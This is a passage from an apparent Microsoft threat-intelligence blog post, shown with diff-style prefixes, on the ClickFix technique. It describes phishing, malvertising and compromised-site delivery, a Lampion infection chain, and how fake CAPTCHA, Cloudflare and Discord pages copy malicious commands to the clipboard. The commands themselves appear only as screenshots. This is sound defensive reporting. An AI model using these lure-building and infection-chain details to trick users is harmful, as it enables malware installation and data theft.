href="https://www.microsoft.com/en-us/security/blog/2025/05/21/lumma-stealer-breaking-down-the-delivery-techniques-and-capabilities-of-a-prolific-infostealer/"&gt;Lumma Stealer&lt;/a&gt; malware. These payloads affect Windows and macOS devices and typically lead to information theft and data exfiltration.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;The ClickFix technique attempts to trick users into running malicious commands on their devices by taking advantage of their target’s tendency to solve minor technical issues and other seemingly benign interactions, such as human verification and CAPTCHA checks. It typically gives the users instructions that involve clicking prompts and copying, pasting, and running commands directly in the Windows &lt;em&gt;Run&lt;/em&gt; dialog box, Windows Terminal, or Windows PowerShell. It’s often combined with delivery vectors such as phishing, malvertising, and drive-by compromises, most of which even &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/03/13/phishing-campaign-impersonates-booking-com-delivers-a-suite-of-credential-stealing-malware/"&gt;impersonate legitimate brands&lt;/a&gt; and organizations to further reduce suspicion from their targets.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Because ClickFix relies on human intervention to launch the malicious commands, a campaign that uses this technique could get past conventional and automated security solutions. Organizations could thus reduce the impact of this technique by educating users in recognizing its lures and by implementing policies that will harden the device configurations in their environment (for example, disallowing users to use the &lt;em&gt;Run&lt;/em&gt; dialog if it’s not necessary in their daily tasks). Microsoft Defender XDR also provides a comprehensive set of protection features that detect this threat at various stages of the attack chain.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;This blog discusses the different elements that make up a ClickFix campaign—from the arrival vectors it comes with to its various implementations—and provides different examples of threat campaigns we’ve observed to further illustrate these elements. We also provide recommendations and detection details to surface and mitigate this threat.&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li class="wp-block-list-item"&gt;&lt;a href="https://www.microsoft.com/en-us/security/blog/feed/#the-clickfix-attack-chain"&gt;The ClickFix attack chain&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;&lt;a href="https://www.microsoft.com/en-us/security/blog/feed/#before-the-click-arrival-vectors"&gt;Before the click: Arrival vectors&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;&lt;a href="https://www.microsoft.com/en-us/security/blog/feed/#inside-the-click-clickfix-implementations"&gt;Inside the click: ClickFix implementations&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;&lt;a href="https://www.microsoft.com/en-us/security/blog/feed/#the-fix-user-level-code-execution"&gt;The “fix”: User-level code execution&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;&lt;a href="https://www.microsoft.com/en-us/security/blog/feed/#beyond-windows-clickfix-targeting-macos-users"&gt;Beyond Windows: ClickFix targeting macOS users&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;&lt;a href="https://www.microsoft.com/en-us/security/blog/feed/#behind-the-click-clickfix-kits-and-other-services-for-sale"&gt;Behind the click: ClickFix kits and other services for sale&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;&lt;a href="https://www.microsoft.com/en-us/security/blog/feed/#clickfix-protection-and-detection"&gt;ClickFix protection and detection&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="the-clickfix-attack-chain"&gt;The ClickFix attack chain&lt;/h2&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;A typical ClickFix attack begins with threat actors using phishing emails, malvertisements, or compromised websites to lead unsuspecting users to a visual lure—usually a landing page—and trick them into executing a malicious command themselves. By adding this user interaction element in the attack chain, a threat using the ClickFix technique could slip through conventional and automated security solutions.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Microsoft Threat Intelligence observed threat actors adapting and improving certain elements of the technique to further evade detection. For example, threat actors obfuscate the JavaScript that generates the visual lures or they download parts of the code from different servers. They also employ various tactics in obfuscating malicious commands. We discuss these stages of the attack chain in detail in the succeeding sections of this blog.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Once the malicious command is run by the user, malware is downloaded into the target device. We’ve observed numerous threat actors that leverage ClickFix attacks deliver the following:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li class="wp-block-list-item"&gt;Infostealers like &lt;a href="https://thecyberwire.com/podcasts/microsoft-threat-intelligence/49/notes"&gt;LummaStealer&lt;/a&gt;, which appears to be the most prolific ClickFix final payload based on our observations and threat hunting investigations &amp;nbsp;&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Remote access tools (RATs) such as Xworm, AsyncRAT, NetSupport, and SectopRAT, which could allow threat actors to conduct hands-on keyboard activity like discovery, lateral movement, and persistence&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Loaders like Latrodectus and MintsLoader, which could deliver additional malware and other payloads&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;Rootkits, such as a modified version of the open source r77, which could allow threat actors to employ several sophisticated persistence and defense evasion tactics and remain deeply embedded in a victim system&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;These final payloads are often “fileless”, that is, they’re seldom written to disk as a Windows executable (&lt;em&gt;.exe&lt;/em&gt; or &lt;em&gt;.dll&lt;/em&gt;) file. Instead, they’re loaded and launched in memory by living-off-the-land binaries (LOLBins), often as a .NET assembly or Common Language Runtime (CLR) module. However, whether the malware is on disk or in memory, we’ve observed its code injected into LOLBins, such as &lt;em&gt;msbuild.exe&lt;/em&gt;, &lt;em&gt;regasm.exe&lt;/em&gt;, or &lt;em&gt;powershell.exe&lt;/em&gt;.&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Diagram showing the typical ClickFix attack chain " class="wp-image-141844 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig1-Typical-ClickFix-attack-chain-1.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 1. The typical ClickFix attack chain&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;h3 class="wp-block-heading" id="case-study-lampion-malware-campaign"&gt;Case study: Lampion malware campaign&lt;/h3&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;To illustrate a typical ClickFix attack chain, let’s look at a campaign we first identified in May 2025 targeting Portuguese organizations in government, finance, and transportation sectors to deliver Lampion malware, an&amp;nbsp;infostealer&amp;nbsp;focused on banking information. This campaign has since been observed in other countries—including Portugal, Switzerland, Luxembourg, France, Hungary, and Mexico—targeting organizations in the government, education, transportation, and financial services industries.&amp;nbsp;As of June 2025, this campaign remains active.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;The&amp;nbsp;Lampion malware campaign&amp;#8217;s ClickFix lures, obfuscation methods, and multi-stage infection process are designed to evade detection:&lt;/p&gt;
-
-
-
-&lt;ol class="wp-block-list"&gt;
-&lt;li class="wp-block-list-item"&gt;The threat actor sends phishing emails containing a ZIP file, which when opened, contains an HTML file that redirects target users to a fake Portuguese tax authority site where the ClickFix lure is hosted.&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;The ClickFix lure tricks users into launching a PowerShell command that downloads an obfuscated VBScript (&lt;em&gt;.vbs&lt;/em&gt;).&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;The downloaded script then writes a second obfuscated &lt;em&gt;.vbs&lt;/em&gt; file to the Windows &lt;em&gt;%TEMP%&lt;/em&gt; directory and schedules it to run later using a hidden task.&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;This&amp;nbsp;second &lt;em&gt;.vbs&lt;/em&gt; file downloads a third and much larger &lt;em&gt;.vbs&lt;/em&gt; file that performs reconnaissance, checks for antivirus or sandbox environments, and sends system data to a command-and-control (C2) server.&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;The third script also creates a &lt;em&gt;.cmd&lt;/em&gt; file in the Windows startup folder, naming it after the user&amp;#8217;s hostname, and schedules a system restart.&lt;/li&gt;
-
-
-
-&lt;li class="wp-block-list-item"&gt;After the device restarts, the &lt;em&gt;.cmd&lt;/em&gt; file launches a large DLL through &lt;em&gt;rundll32.exe&lt;/em&gt; and attempts to deliver the final payload.&lt;/li&gt;
-&lt;/ol&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;However, during our investigation, the actual Lampion malware wasn’t delivered because the download command was commented out of the code.&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Diagram showing the Lampion infection chain using the ClickFix technique" class="wp-image-141845 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig2-Lampion-ClickFix-attack-chain.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 2. Lampion infection chain&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="before-the-click-arrival-vectors"&gt;Before the click: Arrival vectors&lt;/h2&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Threat actors leveraging ClickFix rely on a variety of methods to lure unwitting users. We’ve observed three primary avenues where a user could encounter a ClickFix prompt: by receiving phishing emails, encountering a malicious ad, or by visiting a compromised or malicious website.&lt;/p&gt;
-
-
-
-&lt;h3 class="wp-block-heading" id="phishing"&gt;Phishing&lt;/h3&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Microsoft Threat Intelligence first observed the use of the ClickFix technique between March and June 2024 in email campaigns sent by a threat actor we track as Storm-1607. These emails contained HTML attachments that attempted to install DarkGate, a commodity loader that is capable of keylogging, cryptocurrency mining, establishing C2 communications, and downloading additional malicious payloads, among others.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;One of Storm-1607’s campaigns observed in May 2024 consisted of tens of thousands of emails targeting organizations in the United States (US) and Canada. These emails used payment and invoice lures and contained attachments with file names like &lt;em&gt;reports_528647.html&lt;/em&gt;:&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of a phishing email" class="wp-image-141846 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig3-Storm-1607-phishing-email.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 3. Storm-1607 phishing email&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;When opened, the HTML loaded a page with a fake Microsoft Word new document image and a dialog box showing an error message and prompting the user to click the &lt;strong&gt;How to fix&lt;/strong&gt; button:&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of HTML attachment showing a Microsoft Word background and ClickFix lure" class="wp-image-141847 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig4-HTML-attachment.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 4. HTML attachment displaying a Microsoft Word background and ClickFix lure&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Clicking the button copied the malicious code on the user’s clipboard in the background. Meanwhile, the dialog box added new instructions that explained to the user how to open Windows Terminal and paste the malicious code into it:&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of ClickFix lure displaying further insructions" class="wp-image-141848 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig5-ClickFix-lure.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 5. ClickFix lure displaying further instructions&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;While other threat actors also use invoice or payment lures in their phishing campaigns, as of this writing, including HTML attachments in the emails is no longer the preferred method to implement the ClickFix technique. Instead, threat actors now include in their phishing email a URL that points to a ClickFix landing page. For example, in March 2025, we observed a threat actor tracked as Storm-0426 launch a campaign consisting of thousands of phishing emails that targeted users in Germany and attempted to install MintsLoader. The emails used payment and invoice lures purportedly from a web hosting provider and contained URLs leading to the Prometheus traffic direction system (TDS) hosted on numerous compromised sites:&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of a phishing email" class="wp-image-141849 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig6-Storm-0426-phishing-email.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 6. Storm-0426 phishing email&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;The TDS redirected users to the attacker-controlled website &lt;em&gt;mein-lonos-cloude[.]de&lt;/em&gt;, where the ClickFix technique instructed the users to complete a human verification process by following the displayed instructions, which launched a malicious code:&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of a ClickFix landing page" class="wp-image-141850 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig7-ClickFix-landing-page.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 7. ClickFix landing page&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Another example of a phishing campaign using URLs and redirectors was observed in June 2025, where the campaign impersonated the US Social Security Administration (SSA) and used a combination of social engineering and domain spoofing to deliver ScreenConnect, a legitimate remote management tool that has become increasingly abused by threat actors. Once installed, ScreenConnect could give an attacker full remote control over a victim’s system, enabling them to exfiltrate data, install additional malware, or conduct surveillance.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;The campaign began with emails sent from a legitimate but compromised Brazilian domain. The message, which even included legitimate links to SSA’s official social media accounts in the footer, claimed that there was an issue with the recipient’s social security statement. Like other phishing emails, these characteristics and tactics were all attempts by the threat actor to bypass spam filters, lend credibility and reduce suspicion to the message, and prompt the user to take immediate action:&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of phishing email impersonating SSA" class="wp-image-141851 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig8-Phishing-email.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 8. Phishing email impersonating the US SSA&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;The message’s call-to-action button, labeled &lt;strong&gt;Download Statement&lt;/strong&gt;, was also particularly deceptive because instead of linking directly to a malicious site, it used a Google Ads URL redirect to obfuscate the final destination. This technique not only helped the email pass through conventional email security solutions, it also undermined an email best practice (hovering over the links before clicking to determine if the URL displayed points to the intended site or not) users are typically taught as part of their security awareness trainings.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;When a user clicked the &lt;strong&gt;Download Statement&lt;/strong&gt; button, they were redirected to a spoofed SSA website hosted on a Spanish top-level domain (&lt;em&gt;access-ssa-gov[.]es&lt;/em&gt;). The site closely mimicked the real SSA home page, including a blurred background image of the legitimate site to create a false sense of familiarity and trust:&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of ClickFix landing page impersonating SSA" class="wp-image-141852 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig9-ClickFix-landing-page.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 9. ClickFix landing page impersonating the US SSA&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;The landing page presented the user with a CAPTCHA human verification pop-up, which was part of the ClickFix technique. Behind the scenes, this interaction triggered a series of fake verification steps designed to guide the user into running a PowerShell script that would eventually download and launch the ScreenConnect payload:&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="ClickFix instructions from the spoofed SSA domain" class="wp-image-141853 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig10-ClickFix-instructions.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 10. ClickFix instructions from the spoofed US SSA domain&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;h3 class="wp-block-heading" id="malvertising"&gt;Malvertising&lt;/h3&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Malvertising is another popular delivery method that leads to ClickFix landing pages. In a campaign observed in April 2025, users who attempted to stream free or pirated movies on certain websites inadvertently launched a variety of scam pages in a new browser tab when they interacted with a movie (for example, by pressing the play button):&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of a free moving streaming website" class="wp-image-141854 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig11-Free-moving-streaming-site.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 11. Example of a free movie streaming website&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;One of these scam pages was a ClickFix landing page that downloaded and installed Lumma Stealer:&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of a ClickFix landing page " class="wp-image-141857 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig12-Click-fix-landing-page.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 12. ClickFix landing page the users were redirected to if they clicked the &amp;ldquo;Play&amp;rdquo; button on the free movie website&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;This activity cluster is notable because it renamed the various intermediate HTA scripts to media format extensions such as &lt;em&gt;.mp3&lt;/em&gt;, &lt;em&gt;.mp4&lt;/em&gt;, or &lt;em&gt;.ogg&lt;/em&gt;. It’s also notable for its high traffic volumes: in a single day, tens of thousands, if not hundreds of thousands, of unique visitors could be funneled to scam pages (including the ClickFix landing page) through the malvertising redirectors. &lt;/p&gt;
-
-
-
-&lt;h3 class="wp-block-heading" id="drive-by-compromise"&gt;Drive-by compromise&lt;/h3&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Some threat actors have also been observed to leverage compromised websites to deliver the ClickFix landing page. For example, the threat actor we track as Storm-0249 has traditionally used email to deliver Latrodectus or other initial access malware—whether by using &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/"&gt;PDF files&lt;/a&gt; or URL links (sometimes &lt;a href="https://www.proofpoint.com/us/blog/threat-insight/latrodectus-spider-bytes-ice"&gt;copyright infringement&lt;/a&gt;-themed). However, since the beginning of March 2025, Storm-0249 switched to compromising legitimate websites, potentially through WordPress vulnerabilities, and using the ClickFix technique to deliver its payloads.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;When a user visits the compromised site, the original page is briefly displayed before it’s replaced with the ClickFix human verification lure. This specific lure even spoofs Cloudflare to further trick users into thinking that the verification step is legitimate:&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of a ClickFix lure spoofing Cloudflare Turnstile" class="wp-image-141881 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig13-ClickFix-impersonation-1.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 13. ClickFix lure spoofing Cloudflare Turnstile on a compromised site&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="inside-the-click-clickfix-implementations"&gt;Inside the click: ClickFix implementations&lt;/h2&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;ClickFix operators use several methods to attempt to convince a target to perform user-level command execution on their system. Early landing pages mimicked Google’s “&lt;a href="https://support.google.com/chrome/answer/95669?hl=en&amp;amp;co=GENIE.Platform=Desktop"&gt;Aw, Snap!&lt;/a&gt;” crash error or Word Online extension missing message (as depicted in Figure 4), while recent ones spoof Google’s &lt;a href="https://developers.google.com/recaptcha/"&gt;reCAPTCHA&lt;/a&gt; and Cloudflare’s &lt;a href="https://www.cloudflare.com/application-services/products/turnstile/"&gt;Turnstile&lt;/a&gt; solution. We’ve even observed threat actors spoof social media platforms like Discord to trick users into believing they’re joining an actual Discord server. Many elements go into building ClickFix lure pages—from JavaScript inline frames (iframes) and HTML &lt;em&gt;href&lt;/em&gt; codes to cascading style sheets (CSS) resources—to make them more legitimate-looking.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;There are various ways that ClickFix is implemented: some implementations are contained in one file or page, while others use remote resources. Some threat actors leave code comments amateurishly while others obfuscate their code. There are even implementations that report the status of an infection to a Telegram channel or a web server. We provide a few examples of these implementations and discuss their inner workings.&lt;/p&gt;
-
-
-
-&lt;h3 class="wp-block-heading" id="impersonating-cloudflare-turnstile"&gt;Impersonating Cloudflare Turnstile&lt;/h3&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Figure 14 shows a partial screenshot of a ClickFix landing page, &lt;em&gt;binancepizza[.]info&lt;/em&gt;, displaying a seemingly legitimate Cloudflare Turnstile verification process that a user is lured to interact with before they can supposedly access the site:&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of ClickFix landing page" class="wp-image-141858 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig14-landing-page.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 14. The ClickFix landing page binancepizza[.]info&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Its HTML source code clones this Cloudflare Turnstile style page using a &lt;em&gt;href&lt;/em&gt; attribute to a CSS resource hosted by the Font Awesome library:&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of HTML code " class="wp-image-141859 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig15-HTML-code.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 15. HTML code highlighting a CSS resource for a Cloudflare verification prompt&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;The page also references an HTML file (&lt;em&gt;field.html&lt;/em&gt;) using a hidden iframe:&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of HTML code" class="wp-image-141860 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig16-HTML-code.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 16. HTML code highlighting hidden iframe and text needing to &amp;ldquo;verify&amp;rdquo;&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Within &lt;em&gt;field.html&lt;/em&gt;, we see in Figure 17 that &lt;em&gt;contentEl&lt;/em&gt;is the iframe element representing the fake Cloudflare Turnstile verification check box. When a user ticks the &lt;strong&gt;&lt;em&gt;Verify you are human&lt;/em&gt;&lt;/strong&gt; check box, this script animates a fake spinner through &lt;em&gt;runVerification()&lt;/em&gt;and sends &lt;em&gt;postMessage(&amp;#8220;trigger&amp;#8221;)&lt;/em&gt; to the parent window (the main landing page).&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of JavaScript code" class="wp-image-141861 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig17-HTML-code-iframe.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 17. JavaScript code of iframe field.html, highlighting elements that send a trigger message upon verification click&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;The user is then presented with the ClickFix instructions (Figure 18), while the obfuscated command is copied to the user&amp;#8217;s clipboard (Figure 19):&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of ClickFix instructions" class="wp-image-141862 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig18-ClickFix-instructions.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 18. ClickFix instructions from binancepizza[.]info&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of malicuous command" class="wp-image-141863 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig19-JavaScript-code.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 19. Malicious command copied to clipboard&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Figure 20 shows that the clipboard copy occurs once the code receives the message “trigger”, which is sent by the &lt;em&gt;field.html&lt;/em&gt; hidden iframe. Once that message is received, the script uses &lt;em&gt;navigator.clipboard.writeText(codeToCopy)&lt;/em&gt; to copy the command to the clipboard.&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of JavaScript code" class="wp-image-141864 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig20-JavaScript-code.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 20. JavaScript code highlighting the method navigator.clipboard.writeText, which copies a malicious command to clipboard&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;h3 class="wp-block-heading" id="impersonating-social-platforms"&gt;Impersonating social platforms&lt;/h3&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;It&amp;#8217;s important to note that not all ClickFix landing pages are designed in the same manner and might not strictly contain the elements discussed previously. In some instances, threat actors also mimic popular social platforms to broaden their reach of potential targets.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;Figure 21 shows a ClickFix landing page spoofing a Discord server supposedly needing to verify a user before they can join:&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of Fake Discord page implementing ClickFix" class="wp-image-141865 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig21-Fake-Discord-server.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 21. Fake Discord server landing page implementing ClickFix.&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;In this page’s source code (Figure 22), we can see it referencing the Discord logo image file to appear legitimate. Additionally, the&lt;em&gt;addEventListener&lt;/em&gt; method waits for the &lt;strong&gt;Verify&lt;/strong&gt; button to get clicked (through &lt;em&gt;verifyBtn&lt;/em&gt;) so &lt;em&gt;navgiator.clipboard.writetext(command)&lt;/em&gt; can copy the malicious command to the user’s clipboard. This JavaScript method is a Clipboard API that allows for accessing the operating system (OS) clipboard. Older pages might use &lt;em&gt;document.execCommand()&lt;/em&gt;, which is now deprecated.&lt;/p&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;The fake Discord landing page differs from the previous example because the reference of an external trigger (from the hidden iframe) isn’t used here. Instead, the click then copy is all processed from the main window. Based on our analysis, this landing page also appears to be part of the &lt;a href="https://www.securonix.com/blog/analyzing-obscurebat-threat-actors-lure-victims-into-executing-malicious-batch-scripts-to-deploy-stealthy-rootkits/"&gt;OBSCURE#BAT&lt;/a&gt; campaign delivering r77 rootkit.&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of HTML code" class="wp-image-141866 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig22-HTML-code.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 22. HTML code highlighting use of Discord logo and JavaScript elements that copy a malicious command to clipboard upon clicking &amp;ldquo;verify&amp;rdquo;&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="the-fix-user-level-code-execution"&gt;The “fix”: User-level code execution&lt;/h2&gt;
-
-
-
-&lt;p class="wp-block-paragraph"&gt;The ClickFix technique typically presents its “fix” by instructing users to run malicious commands or code in the Windows &lt;em&gt;Run&lt;/em&gt; dialog box. We assess that the threat actors who use this technique are banking on the idea that most of their targets aren’t familiar with this Windows OS component and what it’s used for, unlike the more advanced users doing system administrator tasks. Early ClickFix lures instructed users to run commands manually and directly in Windows Terminal or Windows PowerShell. However, multiple line warnings might have deterred potential victims from running these commands, leading to the threat actors changing their tactics.&lt;/p&gt;
-
-
-&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Screenshot of multiple line warning in Windows Terminal" class="wp-image-141867 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig23-Multiple-line-warning.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 23. Example of a multiple line warning in Windows Terminal&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;h3 class="wp-block-heading" id="detecting-windows-run-dialog-misuse"&gt;Detecting Windows Run dialog misuse&lt;/h3&gt;
-
-
-
